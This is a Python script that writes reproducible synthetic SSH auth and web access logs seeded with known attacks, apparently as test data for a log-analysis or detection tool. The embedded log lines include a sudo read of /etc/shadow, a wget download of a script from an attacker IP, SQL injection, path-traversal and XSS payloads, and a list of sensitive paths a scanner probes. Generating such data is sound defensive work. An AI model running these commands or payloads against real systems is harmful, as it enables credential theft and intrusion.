"""Generate synthetic auth and access logs with known attacks mixed into normal traffic.

    python scripts/generate_sample_logs.py

Writes data/sample_auth.log and data/sample_access.log. Seeded, so output is reproducible.
"""

import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(42)
DATA = Path(__file__).resolve().parent.parent / "data"
BASE = datetime(2026, 10, 20, 8, 0, 0)

USERS = ["akshat", "priya", "rahul", "deploy", "ananya"]
OFFICE_IPS = [f"10.0.0.{i}" for i in range(10, 25)]


def syslog(ts: datetime, process: str, pid: int, msg: str) -> str:
    return f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} webserver {process}[{pid}]: {msg}"


def auth_logs() -> list[str]:
    lines = []
    t = BASE
    # Normal daytime logins with the occasional typo.
    for _ in range(120):
        t += timedelta(minutes=random.randint(1, 8))
        user, ip = random.choice(USERS), random.choice(OFFICE_IPS)
        pid = random.randint(1000, 9999)
        if random.random() < 0.08:
            lines.append(syslog(t, "sshd", pid, f"Failed password for {user} from {ip} port {random.randint(40000, 60000)} ssh2"))
            t += timedelta(seconds=20)
        lines.append(syslog(t, "sshd", pid, f"Accepted password for {user} from {ip} port {random.randint(40000, 60000)} ssh2"))
        lines.append(syslog(t, "sshd", pid, f"pam_unix(sshd:session): session opened for user {user} by (uid=0)"))

    # Attack 1: brute force from an external IP that never succeeds.
    t = BASE + timedelta(hours=3)
    for i in range(40):
        user = random.choice(["root", "admin", "oracle", "test", "ubuntu"])
        lines.append(syslog(t + timedelta(seconds=i * 4), "sshd", 4242,
                            f"Failed password for invalid user {user} from 185.220.101.7 port {50000 + i} ssh2"))

    # Attack 2: password spray that ends in a successful login (compromise).
    t = BASE + timedelta(hours=5)
    for i in range(6):
        lines.append(syslog(t + timedelta(seconds=i * 30), "sshd", 5151,
                            f"Failed password for deploy from 91.240.118.22 port {51000 + i} ssh2"))
    lines.append(syslog(t + timedelta(minutes=4), "sshd", 5151,
                        "Accepted password for deploy from 91.240.118.22 port 51010 ssh2"))

    # Attack 3: the compromised account reads /etc/shadow with sudo at 2 AM.
    t = BASE + timedelta(hours=18)
    lines.append(syslog(t, "sshd", 6161, "Accepted password for deploy from 91.240.118.22 port 52000 ssh2"))
    lines.append(syslog(t + timedelta(minutes=1), "sudo", 6162,
                        "  deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow"))
    lines.append(syslog(t + timedelta(minutes=2), "sudo", 6163,
                        "  deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://91.240.118.22/x.sh"))

    # Noise the parser should skip.
    lines.append(syslog(BASE, "CRON", 999, "pam_unix(cron:session): session closed for user root"))
    lines.append("this line is malformed and should be counted as unparsed")

    def key(line):
        try:
            return datetime.strptime("2026 " + line[:15], "%Y %b %d %H:%M:%S")
        except ValueError:
            return BASE
    return sorted(lines, key=key)


def access_line(ts, ip, method, path, status, size, agent="Mozilla/5.0"):
    return f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} +0530] "{method} {path} HTTP/1.1" {status} {size} "-" "{agent}"'


def access_logs() -> list[str]:
    lines = []
    pages = ["/", "/login", "/dashboard", "/api/courses", "/api/profile", "/static/app.js", "/static/style.css"]
    clients = [f"49.36.{random.randint(0, 255)}.{random.randint(1, 254)}" for _ in range(30)]
    t = BASE
    for _ in range(900):
        t += timedelta(seconds=random.randint(1, 40))
        lines.append(access_line(t, random.choice(clients), "GET", random.choice(pages),
                                 random.choices([200, 304, 404], [90, 8, 2])[0], random.randint(200, 9000)))

    # Directory scanner: burst of 404s.
    t = BASE + timedelta(hours=2)
    for i, path in enumerate(["/admin", "/backup", "/old", "/.git/config", "/.env", "/phpmyadmin",
                              "/wp-login.php", "/wp-config.php", "/config.bak", "/db.sql", "/test",
                              "/server-status", "/api/v1/debug", "/console", "/actuator"]):
        lines.append(access_line(t + timedelta(seconds=i * 2), "45.155.205.99", "GET", path, 404, 150, "gobuster/3.6"))

    # SQL injection, path traversal and XSS attempts.
    t = BASE + timedelta(hours=4)
    for i, path in enumerate([
        "/api/courses?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
        "/login?user=admin'--",
        "/api/courses?id=1%20OR%201=1",
        "/static/../../../../etc/passwd",
        "/search?q=<script>alert(1)</script>",
    ]):
        lines.append(access_line(t + timedelta(seconds=i * 5), "103.75.190.11", "GET", path, 400, 300, "sqlmap/1.8"))

    # Scraper: far more requests than any normal client.
    t = BASE + timedelta(hours=6)
    for i in range(400):
        lines.append(access_line(t + timedelta(seconds=i), "20.171.207.5", "GET",
                                 f"/api/courses?page={i}", 200, 4000, "python-requests/2.31"))

    lines.sort(key=lambda l: datetime.strptime(l.split("[")[1].split("]")[0], "%d/%b/%Y:%H:%M:%S %z"))
    return lines


def main():
    DATA.mkdir(exist_ok=True)
    (DATA / "sample_auth.log").write_text("\n".join(auth_logs()) + "\n", encoding="utf-8")
    (DATA / "sample_access.log").write_text("\n".join(access_logs()) + "\n", encoding="utf-8")
    print(f"Wrote {DATA / 'sample_auth.log'} and {DATA / 'sample_access.log'}")


if __name__ == "__main__":
    main()
